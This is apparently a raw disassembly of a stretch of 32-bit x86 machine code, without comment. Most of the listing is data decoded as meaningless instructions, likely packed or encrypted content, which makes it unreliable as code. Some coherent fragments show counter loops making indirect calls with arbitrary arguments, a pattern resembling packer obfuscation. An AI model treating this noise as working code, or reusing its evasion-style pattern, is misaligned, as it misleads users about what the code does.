  405191:	jg     0x4051ff
  405193:	jmp    0x40520d
  405195:	mov    edx,ebx
  405197:	rcr    DWORD PTR [ebp+0x61],cl
  40519a:	cmc    
  40519b:	mov    ds:0x87f765b0,eax
  4051a0:	cmp    ecx,DWORD PTR ds:0xe1cd64cb
  4051a6:	inc    ecx
  4051a7:	les    eax,FWORD PTR [edx+0x6a]
  4051aa:	ins    BYTE PTR es:[edi],dx
  4051ab:	jg     0x4051d5
  4051ad:	cmp    al,0x96
  4051af:	xor    BYTE PTR [ebp+esi*4-0x5e],0xeb
  4051b4:	jno    0x405155
  4051b6:	stos   BYTE PTR es:[edi],al
  4051b7:	cli    
  4051b8:	stos   BYTE PTR es:[edi],al
  4051b9:	jp     0x405223
  4051bb:	enter  0x3777,0x66
  4051bf:	cmc    
  4051c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051c1:	jle    0x405181
  4051c3:	push   esp
  4051c4:	mov    esp,0x4a4a5472
  4051c9:	jge    0x40519f
  4051cb:	leave  
  4051cc:	sahf   
  4051cd:	push   ebp
  4051ce:	ds out 0x7a,al
  4051d1:	stc    
  4051d2:	cmp    cl,cl
  4051d4:	pop    es
  4051d5:	scas   al,BYTE PTR es:[edi]
  4051d6:	cmc    
  4051d7:	inc    esi
  4051d8:	or     bh,BYTE PTR [esp+ecx*4+0x443f6e02]
  4051df:	jbe    0x4051e8
  4051e1:	jmp    0x820e:0x1f258cfc
  4051e8:	fldenv [esp+esi*8+0xa]
  4051ec:	(bad)  
  4051ed:	imul   ecx,DWORD PTR ds:0x41647436,0x7a158914
  4051f7:	dec    edx
  4051f8:	mov    eax,0x484a83c3
  4051fe:	xor    DWORD PTR [edx+0x19eed04a],edx
  405204:	sub    al,0xce
  405206:	inc    ecx
  405207:	xchg   BYTE PTR ds:0xd73dcdce,ch
  40520d:	add    DWORD PTR [edx],ebx
  40520f:	add    eax,DWORD PTR [edi]
  405211:	cmp    dl,BYTE PTR [ecx*2-0x611ad816]
  405218:	and    dl,BYTE PTR [esi-0x39]
  40521b:	pop    esi
  40521c:	mov    eax,0x9363c834
  405221:	xchg   edi,eax
  405222:	(bad)  
  405223:	nop
  405224:	dec    esp
  405225:	xchg   edi,eax
  405226:	test   BYTE PTR [esi],dl
  405228:	iret   
  405229:	(bad)  
  40522a:	xchg   ebp,eax
  40522b:	aam    0x63
  40522d:	pop    edi
  40522e:	(bad)  [ebx+0x1c]
  405231:	test   al,0xef
  405233:	or     DWORD PTR [esi],edi
  405235:	sub    eax,0xaf46629
  40523a:	mov    ecx,0x3ecc0d9c
  40523f:	ds into 
  405241:	sbb    BYTE PTR [ecx-0x2e763bfd],bl
  405247:	mov    WORD PTR [edx*2+0x39ad1f7a],es
  40524e:	jne    0x40529d
  405250:	outs   dx,BYTE PTR ds:[esi]
  405251:	cmc    
  405252:	int3   
  405253:	lods   al,BYTE PTR ds:[esi]
  405254:	movsx  ebp,WORD PTR [esi+esi*4-0x6182ff91]
  40525c:	push   esi
  40525d:	dec    ecx
  40525e:	das    
  40525f:	sbb    bl,BYTE PTR [eax]
  405261:	fbld   TBYTE PTR ss:[ebx]
  405264:	sbb    DWORD PTR [eax-0x38571f7f],0x6
  40526b:	inc    edi
  40526c:	stos   DWORD PTR es:[edi],eax
  40526d:	cwde   
  40526e:	cdq    
  40526f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405270:	and    esi,DWORD PTR [esi-0x58a236a4]
  405276:	cmp    al,0x2e
  405278:	xchg   ebp,ecx
  40527a:	nop
  40527b:	mov    BYTE PTR [edx],0xef
  40527e:	sbb    al,0x50
  405280:	cmp    BYTE PTR [edi+0x5ec04850],bh
  405286:	jecxz  0x40521e
  405288:	call   0x262945fa
  40528d:	in     al,0x58
  40528f:	lods   eax,DWORD PTR ds:[esi]
  405290:	in     eax,dx
  405291:	stos   DWORD PTR es:[edi],eax
  405292:	iret   
  405293:	and    DWORD PTR [esi+eiz*8],0xe7700e43
  40529a:	jecxz  0x40526e
  40529c:	ins    BYTE PTR es:[edi],dx
  40529d:	jb     0x40525d
  40529f:	ja     0x405316
  4052a1:	mov    ebp,0xb709f8cc
  4052a6:	inc    esi
  4052a7:	fldcw  WORD PTR [ebp-0x4d334243]
  4052ad:	inc    ebp
  4052ae:	pop    ss
  4052af:	adc    ch,BYTE PTR [esi-0x1]
  4052b2:	dec    ebp
  4052b3:	inc    ecx
  4052b4:	xchg   BYTE PTR [edx],al
  4052b6:	push   ds
  4052b7:	test   DWORD PTR [ebx-0x6],esp
  4052ba:	inc    ebx
  4052bb:	loop   0x40532f
  4052bd:	mov    ecx,esi
  4052bf:	jl     0x405243
  4052c1:	nop
  4052c2:	add    esp,DWORD PTR [ecx-0x1cd9576b]
  4052c8:	test   DWORD PTR [ebx-0xf],0x91760a67
  4052cf:	ins    BYTE PTR es:[edi],dx
  4052d0:	cli    
  4052d1:	test   DWORD PTR [ecx-0x30],ecx
  4052d4:	mov    al,ds:0xb3531149
  4052d9:	fstp   DWORD PTR [ebx]
  4052db:	mov    bl,ah
  4052dd:	int3   
  4052de:	outs   dx,BYTE PTR ds:[esi]
  4052df:	jne    0x405294
  4052e1:	sub    BYTE PTR [edi+0x292cff14],ch
  4052e7:	mov    ds:0xe81c8693,eax
  4052ec:	jecxz  0x4052ca
  4052ee:	inc    eax
  4052ef:	xor    eax,0x442d366f
  4052f4:	or     DWORD PTR ds:[esi+0x47],0xd04d24a6
  4052fc:	or     dh,BYTE PTR [edi-0x602ba76b]
  405302:	push   ebx
  405303:	add    DWORD PTR [edi+ebx*4],esp
  405306:	and    eax,0x9d3614ac
  40530b:	push   ds
  40530c:	in     eax,dx
  40530d:	sar    dh,0x52
  405310:	hlt    
  405311:	mov    edx,0x4b3cf88e
  405316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405317:	popf   
  405318:	and    ecx,0x8ad52fff
  40531e:	ss scas eax,DWORD PTR es:[edi]
  405320:	mov    dl,0x88
  405322:	mov    DWORD PTR [eax+0x40],0x5a536f53
  405329:	add    al,0x56
  40532b:	mov    dh,0xaf
  40532d:	iret   
  40532e:	int    0x66
  405330:	xchg   ecx,eax
  405331:	jmp    0x2b10:0x9a182efd
  405338:	inc    ebp
  405339:	xor    dh,BYTE PTR [ebp-0x76be8cfd]
  40533f:	je     0x405346
  405341:	jmp    0xe7056fd6
  405346:	dec    esi
  405347:	dec    esi
  405348:	push   es
  405349:	idiv   BYTE PTR [ebp+0x22b51df4]
  40534f:	and    ecx,0xb0d5c0d2
  405355:	pushf  
  405356:	add    al,0x60
  405358:	adc    al,0xf7
  40535a:	imul   edi,DWORD PTR [edi-0x19b6183a],0x897a54f3
  405364:	call   DWORD PTR [edi+0x64a6c0f5]
  40536a:	jno    0x40530d
  40536c:	and    BYTE PTR [eax+esi*8-0x3d9e342c],ch
  405373:	push   ebp
  405374:	mov    dl,0xe9
  405376:	dec    edi
  405377:	push   ecx
  405378:	sub    edi,edi
  40537a:	lock out dx,eax
  40537c:	mov    dl,0x5b
  40537e:	lods   eax,DWORD PTR ds:[esi]
  40537f:	and    al,0x16
  405381:	scas   eax,DWORD PTR es:[edi]
  405382:	mul    DWORD PTR [eax+0x72]
  405385:	ret    0x3b00
  405388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405389:	sub    edx,DWORD PTR [edi+esi*2-0x2]
  40538d:	nop
  40538e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40538f:	or     dl,BYTE PTR [ecx-0x3f]
  405392:	retf   0x4363
  405395:	loop   0x40533d
  405397:	jno    0x405368
  405399:	aas    
  40539a:	neg    BYTE PTR [ebx-0x66f572d2]
  4053a0:	inc    ecx
  4053a1:	je     0x405385
  4053a3:	loop   0x405403
  4053a5:	push   0xb8717a7
  4053aa:	repnz (bad) 
  4053ac:	push   esi
  4053ad:	and    edx,DWORD PTR [eax+0x1]
  4053b0:	mov    esi,0xfbeeca79
  4053b5:	aam    0x52
  4053b7:	mov    ecx,0xd1406bbc
  4053bc:	dec    eax
  4053be:	mov    edi,0xe37e3a7e
  4053c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053c4:	sub    al,0x21
  4053c6:	mov    eax,0x3ca47348
  4053cb:	mov    edx,?
  4053cd:	cs or  al,0xd
  4053d0:	mov    al,0xcf
  4053d2:	jmp    0x4053f9
  4053d4:	(bad)  
  4053d5:	icebp  
  4053d6:	push   ebx
  4053d7:	jnp    0x40544c
  4053d9:	push   ecx
  4053da:	(bad)  
  4053db:	loopne 0x40538e
  4053dd:	push   es
  4053de:	js     0x4053e8
  4053e0:	mov    esp,DWORD PTR [eax]
  4053e2:	sbb    bh,BYTE PTR [esi-0x74]
  4053e5:	(bad)  
  4053e6:	(bad)  
  4053e7:	pop    edx
  4053e8:	loope  0x40544a
  4053ea:	cld    
  4053eb:	push   es
  4053ec:	mov    bh,0x5c
  4053ee:	addr16 inc ebp
  4053f0:	ins    BYTE PTR es:[edi],dx
  4053f1:	fdivr  DWORD PTR [edi-0x21ab76b1]
  4053f7:	pop    eax
  4053f8:	dec    ebp
  4053f9:	add    DWORD PTR [ecx+0xb44c2f6],0x8269c7c3
  405403:	call   0xcaaf:0xf65df136
  40540a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540b:	xchg   ah,cl
  40540d:	sub    DWORD PTR [edx-0x6c],ebx
  405410:	out    0xc5,eax
  405412:	or     al,BYTE PTR fs:[ecx+ebp*4]
  405416:	pop    ecx
  405417:	std    
  405418:	pop    ds
  405419:	mov    ds,WORD PTR [ecx+0x2faa0e05]
  40541f:	dec    esp
  405420:	and    eax,0x809359ce
  405425:	pop    ss
  405426:	sbb    edi,DWORD PTR [ebx]
  405428:	mov    DWORD PTR ds:0xf4f9de13,edx
  40542e:	dec    ebp
  40542f:	xor    dl,BYTE PTR [ebp+0x780d2c9f]
  405435:	sub    al,0x2a
  405437:	ss imul edx,edi,0xffffffd7
  40543b:	jmp    0x40541f
  40543d:	fbld   TBYTE PTR gs:[esi+0x70b48479]
  405444:	cwde   
  405445:	xchg   edx,eax
  405446:	lds    ebp,FWORD PTR [ebx+edx*8+0x1bc2f242]
  40544d:	pop    ebp
  40544e:	rcr    dl,cl
  405450:	es cmc 
  405452:	add    DWORD PTR [eax-0x4e3e83e6],0xfffffff8
  405459:	mov    ah,0xb8
  40545b:	cdq    
  40545c:	mov    dh,0x48
  40545e:	jnp    0x405457
  405460:	mov    ch,0xb1
  405462:	retf   
  405463:	xchg   esp,eax
  405464:	ins    BYTE PTR es:[edi],dx
  405465:	iret   
  405466:	aas    
  405467:	mov    ds:0x1c6ea17c,al
  40546c:	mov    ah,0x33
  40546e:	popf   
  40546f:	jl     0x4054da
  405471:	pop    ecx
  405472:	cdq    
  405473:	pop    ecx
  405474:	mov    dh,0xdd
  405476:	retf   0x8c30
  405479:	fst    QWORD PTR [esi+0x64e607c4]
  40547f:	sbb    eax,0x756fe502
  405484:	icebp  
  405485:	gs jne 0x40546b
  405488:	adc    dl,dh
  40548a:	mov    edi,0x894ae5d9
  40548f:	pop    ebx
  405490:	sbb    bh,BYTE PTR [ebp+0x2e]
  405493:	je     0x4054ff
  405495:	ss jecxz 0x4054c7
  405498:	(bad)  
  405499:	out    0xf5,eax
  40549b:	jl     0x40542f
  40549d:	shl    eax,cl
  40549f:	mov    eax,cs
  4054a1:	loopne 0x405469
  4054a3:	jmp    0x4450d63d
  4054a8:	push   ebx
  4054a9:	xchg   DWORD PTR [edx+eax*8-0x59],ebx
  4054ad:	xor    al,BYTE PTR [edx-0x1957c86d]
  4054b3:	loop   0x405524
  4054b5:	push   esp
  4054b6:	cmp    al,0x59
  4054b8:	push   esp
  4054b9:	pop    ss
  4054ba:	pop    ecx
  4054bb:	adc    al,0x69
  4054bd:	mov    ebx,0xea8e3716
  4054c2:	mov    bh,0x6a
  4054c4:	xchg   esp,eax
  4054c5:	push   esp
  4054c6:	jmp    0x40548c
  4054c8:	imul   ecx,edi,0xffffff91
  4054cb:	mov    ds:0xe9d10301,eax
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x7fbfc9e0
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x40567d
  40563a:	mov    ch,0xc3
  40563c:	mov    ch,0x5c
  40563e:	out    0x78,eax
  405640:	push   esi
  405641:	loop   0x40563e
  405643:	sub    ebx,DWORD PTR [edi+0x46]
  405646:	mov    cs,WORD PTR [eax+esi*8-0x4e]
  40564a:	sub    DWORD PTR ds:0x2d4355cf,esi
  405650:	adc    eax,0x551e40b0
  405655:	inc    edx
  405656:	jg     0x405681
  405658:	push   esi
  405659:	add    eax,0xf21e3d4f
  40565e:	sbb    bh,BYTE PTR [ecx-0x7a07e8fd]
  405664:	(bad)  
  405665:	xchg   edi,eax
  405666:	retf   
  405667:	aad    0x50
  405669:	sbb    bh,BYTE PTR [ecx]
  40566b:	mov    ds:0xa7d4f57b,eax
  405670:	fwait
  405671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405672:	cmp    edx,0x7
  405675:	and    BYTE PTR [edx+0x2c4f4db3],cl
  40567b:	sbb    ebx,DWORD PTR [eax+edx*4-0x43b1808]
  405682:	mov    dh,BYTE PTR [edx+0x79]
  405685:	mov    ss,WORD PTR [eax]
  405687:	loopne 0x405696
  405689:	ss jl  0x4056ba
  40568c:	cmp    BYTE PTR [esi-0x42],dl
  40568f:	dec    esi
  405690:	stos   DWORD PTR es:[edi],eax
  405691:	xor    eax,0x953b9f4c
  405696:	jne    0x40565a
  405698:	fidiv  DWORD PTR [ebx]
  40569a:	test   eax,0x86f6bd4d
  40569f:	lods   al,BYTE PTR ds:[esi]
  4056a0:	into   
  4056a1:	inc    ebx
  4056a2:	fcom   DWORD PTR ds:0xff3d43b6
  4056a8:	out    0xce,eax
  4056aa:	lahf   
  4056ab:	cld    
  4056ac:	mov    ah,0x29
  4056ae:	popa   
  4056af:	pushf  
  4056b0:	fwait
  4056b1:	call   0x71f4:0x8ed36764
  4056b8:	inc    esp
  4056b9:	sbb    BYTE PTR [edi],cl
  4056bb:	loope  0x4056b7
  4056bd:	out    dx,al
  4056be:	and    eax,0xf3c5a4e6
  4056c3:	inc    edx
  4056c4:	in     eax,0xc6
  4056c6:	mov    eax,ds:0xa6ad0744
  4056cb:	adc    eax,0xcf46d2bf
  4056d0:	ss aam 0xb6
  4056d3:	or     esi,ecx
  4056d5:	sbb    dh,BYTE PTR [edi]
  4056d7:	dec    ebx
  4056d8:	stc    
  4056d9:	fadd   QWORD PTR ds:0x5a4f552b
  4056df:	mov    ch,0x46
  4056e1:	jns    0x40574b
  4056e3:	pop    esi
  4056e4:	sub    ch,BYTE PTR [esi-0x50]
  4056e7:	lods   al,BYTE PTR ds:[esi]
  4056e8:	jo     0x4056c7
  4056ea:	addr16 sahf 
  4056ec:	add    eax,0x85342741
  4056f1:	xor    ebp,DWORD PTR [ebx]
  4056f3:	sbb    al,0x19
  4056f5:	lods   al,BYTE PTR ds:[esi]
  4056f6:	mov    dh,0x99
  4056f8:	arpl   WORD PTR [edx-0x2c],bp
  4056fb:	cld    
  4056fc:	xor    al,0x9c
  4056fe:	mov    ebp,0xd6bc6510
  405703:	sub    eax,DWORD PTR [ecx+0xe]
  405706:	fisubr WORD PTR [ebx]
  405708:	cmc    
  405709:	xor    ch,BYTE PTR [esi-0x75]
  40570c:	or     BYTE PTR [edx-0x2e],0x76
  405710:	hlt    
  405711:	inc    ecx
  405712:	(bad)  
  405713:	sub    BYTE PTR [ebp+0x69992cde],bh
  405719:	sbb    ecx,ebp
  40571b:	arpl   WORD PTR [esi-0x51],bp
  40571e:	jl     0x4056ef
  405720:	(bad)  
  405721:	(bad)  
  405722:	fdivr  DWORD PTR [ecx-0x5337000e]
  405728:	cs fst st(4)
  40572b:	xchg   eax,esp
  40572d:	data16 (bad) 
  40572f:	sbb    ch,ah
  405731:	mov    dl,BYTE PTR [edi+0x5be323f7]
  405737:	sub    al,0x44
  405739:	jg     0x4056e2
  40573b:	push   ds
  40573c:	pop    edx
  40573d:	test   DWORD PTR [ebp-0x79],edi
  405740:	lahf   
  405741:	pop    ss
  405742:	mov    eax,0x1f833f24
  405747:	xor    bl,BYTE PTR [esi-0x11]
  40574a:	pop    ds
  40574b:	sbb    dl,BYTE PTR [edx+eiz*8+0x3b21e69c]
  405752:	rcl    DWORD PTR [esi-0x37],1
  405755:	mov    esi,0xed8e444b
  40575a:	lds    esp,FWORD PTR [esp+esi*1-0x5e]
  40575e:	or     bh,BYTE PTR [ecx-0x15]
  405761:	mov    DWORD PTR [ebx+ebx*1-0x7d],edi
  405765:	rol    BYTE PTR [ecx-0x146ad1aa],cl
  40576b:	sub    bl,cl
  40576d:	cli    
  40576e:	out    0x6,eax
  405770:	mov    bl,0x6f
  405772:	ret    
  405773:	mov    edx,0x98fe1168
  405778:	cmp    BYTE PTR [eax+0x73e96861],ah
  40577e:	jp     0x40571e
  405780:	shr    bl,0xed
  405783:	and    edx,ecx
  405785:	xor    edx,DWORD PTR ds:0xd5639745
  40578b:	xchg   ecx,eax
  40578c:	inc    edx
  40578d:	adc    eax,0x8ebc00ee
  405792:	xor    al,0x1b
  405794:	cmp    eax,0x6de5b14b
  405799:	push   es
  40579a:	loopne 0x405795
  40579c:	popa   
  40579d:	lock dec esi
  40579f:	push   edx
  4057a0:	xor    al,0x9b
  4057a2:	or     bl,BYTE PTR [eax]
  4057a4:	ins    DWORD PTR es:[edi],dx
  4057a5:	adc    DWORD PTR [edi+ebp*1],ecx
  4057a8:	loop   0x40573b
  4057aa:	out    dx,eax
  4057ab:	outs   dx,BYTE PTR ds:[esi]
  4057ac:	lods   al,BYTE PTR ds:[esi]
  4057ad:	pop    edi
  4057ae:	loope  0x40573c
  4057b0:	mov    esp,0x2cf9c621
  4057b5:	add    DWORD PTR [esi+0x40],edx
  4057b8:	xchg   ebx,eax
  4057b9:	imul   eax,DWORD PTR [edi+edi*4],0x65
  4057bd:	mov    dh,0x2e
  4057bf:	mov    dh,0x94
  4057c1:	mov    bl,0x69
  4057c3:	push   ds
  4057c4:	add    eax,0x18cbd914
  4057c9:	stos   DWORD PTR es:[edi],eax
  4057ca:	stos   BYTE PTR es:[edi],al
  4057cb:	ins    BYTE PTR es:[edi],dx
  4057cc:	sti    
  4057cd:	and    al,0x23
  4057cf:	fisttp QWORD PTR [ecx-0x5a]
  4057d2:	dec    edx
  4057d3:	add    eax,0x26ddbc4e
  4057d8:	imul   ebp,DWORD PTR [ecx+0x2566b415],0x76b5ab79
  4057e2:	dec    edx
  4057e3:	pop    ds
  4057e4:	cmp    DWORD PTR [esi+0x13bb3977],0x13
  4057eb:	mov    eax,0x328f5634
  4057f0:	lahf   
  4057f1:	xchg   esp,eax
  4057f2:	sub    edx,edx
  4057f4:	xchg   ecx,eax
  4057f5:	pop    es
  4057f6:	mov    edi,0x8dd2d5eb
  4057fb:	fsub   DWORD PTR [edx+0x6e3785f2]
  405801:	lods   al,BYTE PTR ds:[esi]
  405802:	cmp    ch,BYTE PTR [esi]
  405804:	dec    edx
  405805:	jmp    0xb3ca:0xd8aa0db2
  40580c:	mov    esp,0xae445b6a
  405811:	lds    ebp,FWORD PTR [ebx-0x5f]
  405814:	mov    dl,0x1
  405816:	or     dl,dh
  405818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405819:	sbb    DWORD PTR [edx+0x24a86a5b],esp
  40581f:	packuswb mm0,mm1
  405822:	mov    DWORD PTR [esi-0x38ac8142],ebx
  405828:	pop    esp
  405829:	jle    0x405874
  40582b:	leave  
  40582c:	inc    edx
  40582d:	std    
  40582e:	stos   DWORD PTR es:[edi],eax
  40582f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405830:	dec    esp
  405831:	daa    
  405832:	push   edx
  405833:	ret    0x9959
  405836:	xor    eax,0xdf08b0ed
  40583b:	outs   dx,DWORD PTR ds:[esi]
  40583c:	mov    esi,0xbee92d2
  405841:	ret    0xef2c
  405844:	enter  0xa922,0xc2
  405848:	xchg   ebp,eax
  405849:	je     0x40583a
  40584b:	dec    ecx
  40584c:	and    BYTE PTR [esi],0x5c
  40584f:	bnd ret 
  405851:	daa    
  405852:	or     BYTE PTR [eax],dh
  405854:	xor    esi,DWORD PTR [esi+0x72c6c105]
  40585a:	mov    dl,0x5f
  40585c:	mov    ebx,0xf576898
  405861:	mov    ah,0x31
  405863:	cwde   
  405864:	(bad)  
  405865:	mov    ebp,0xd53f7f3c
  40586a:	sub    dl,BYTE PTR [ebx]
  40586c:	adc    bl,BYTE PTR [edi-0x39]
  40586f:	xchg   ebx,eax
  405870:	lods   eax,DWORD PTR ds:[esi]
  405871:	cli    
  405872:	push   edx
  405873:	adc    DWORD PTR [esi],esp
  405875:	ret    0x4c73
  405878:	adc    al,0xac
  40587a:	mov    ds:0x660290dc,eax
  40587f:	retf   
  405880:	and    DWORD PTR [edx],edi
  405882:	mov    edx,0xb5ae528a
  405887:	mov    dl,BYTE PTR [ecx+ebp*8+0x1e]
  40588b:	sub    ebx,ebp
  40588d:	push   0xe3029bae
  405892:	(bad)  
  405894:	xchg   esi,eax
  405895:	or     eax,0x275eba3b
  40589a:	pop    ss
  40589b:	cdq    
  40589c:	test   DWORD PTR [edx],0x3507e2d4
  4058a2:	and    eax,0x1c8c86e7
  4058a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a8:	ss sbb eax,0x176cb01d
  4058ae:	aas    
  4058af:	jl     0x40583a
  4058b1:	ja     0x405900
  4058b3:	push   cs
  4058b4:	sub    edx,DWORD PTR [ebx+0x1e]
  4058b7:	and    eax,0x3867608
  4058bc:	jae    0x40585b
  4058be:	xchg   ebx,eax
  4058bf:	adc    al,0x49
  4058c1:	dec    esi
  4058c2:	idiv   BYTE PTR [edx-0x2a]
  4058c5:	add    edx,DWORD PTR [edi+edx*1+0x6c]
  4058c9:	out    dx,eax
  4058ca:	clc    
  4058cb:	mov    ch,0xb9
  4058cd:	mov    DWORD PTR [ebx-0x19],eax
  4058d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d1:	jmp    0x4058cd
  4058d3:	or     ebp,DWORD PTR [edx+0x9]
  4058d6:	in     eax,dx
  4058d7:	and    cl,BYTE PTR [eax*2-0x77268c17]
  4058de:	jae    0x4058ca
  4058e0:	fist   WORD PTR [edx+eax*4-0x73b20a15]
  4058e7:	push   esi
  4058e8:	jnp    0x40590a
  4058ea:	pusha  
  4058eb:	push   edi
  4058ec:	xor    BYTE PTR [eax-0x7780a219],bh
  4058f2:	push   ebp
  4058f3:	sbb    eax,0x4c29ec8e
  4058f8:	cwde   
  4058f9:	std    
  4058fa:	push   es
  4058fb:	pushf  
  4058fc:	mov    bh,0x58
  4058fe:	cmp    eax,0x7fb6f5f
  405903:	adc    ch,BYTE PTR [eax+0x10]
  405906:	lahf   
  405907:	mov    al,cl
  405909:	out    0xe7,al
  40590b:	aaa    
  40590c:	mov    ds:0x7b0e25c7,al
  405911:	dec    DWORD PTR [esi+0xf9a1a71]
  405917:	cld    
  405918:	pop    eax
  405919:	inc    ebp
  40591a:	jmp    0x120:0xb349d770
  405921:	pushf  
  405922:	fdivrp st(4),st
  405924:	jg     0x405919
  405926:	inc    edi
  405927:	cmc    
  405928:	popa   
  405929:	(bad)  
  40592a:	sbb    BYTE PTR [edi+0x33],al
  40592d:	xor    DWORD PTR [ebx+0x55],ecx
  405930:	ret    0xa6c9
  405933:	popf   
  405934:	test   BYTE PTR [edx],bh
  405936:	adc    ebx,ebx
  405938:	xchg   ebx,eax
  405939:	or     al,0x57
  40593b:	mov    dl,0x67
  40593d:	xchg   esi,eax
  40593e:	adc    eax,0x2f15b20a
  405943:	shl    DWORD PTR [edx+0x45aeeecc],1
  405949:	sbb    al,0x3d
  40594b:	ss push edi
  40594d:	mov    WORD PTR [edi-0xe049343],fs
  405953:	push   edx
  405954:	jne    0x405945
  405956:	test   DWORD PTR [esi],esi
  405958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405959:	mov    bh,0x3d
  40595b:	div    ecx
  40595d:	and    dl,BYTE PTR [eax]
  40595f:	lds    ecx,FWORD PTR [ebx+0x61]
  405962:	popf   
  405963:	idiv   bl
  405965:	xlat   BYTE PTR ds:[ebx]
  405966:	retf   0x2a0d
  405969:	js     0x4059d4
  40596b:	sbb    eax,0x9a843920
  405970:	lds    eax,FWORD PTR [esi+ebp*4-0x4b]
  405974:	mov    ebx,DWORD PTR [edi]
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	push   ebp
  4059b1:	pushf  
  4059b2:	lods   eax,DWORD PTR ds:[esi]
  4059b3:	fwait
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x4059bb
  4059bd:	pop    esi
  4059be:	and    eax,0xdbfaa8d
  4059c3:	xor    ebp,DWORD PTR [ebx+0x73092d1f]
  4059c9:	retf   
  4059ca:	or     ebx,esi
  4059cc:	dec    esi
  4059cd:	jns    0x4059ce
  4059cf:	and    bh,dh
  4059d1:	in     al,dx
  4059d2:	push   es
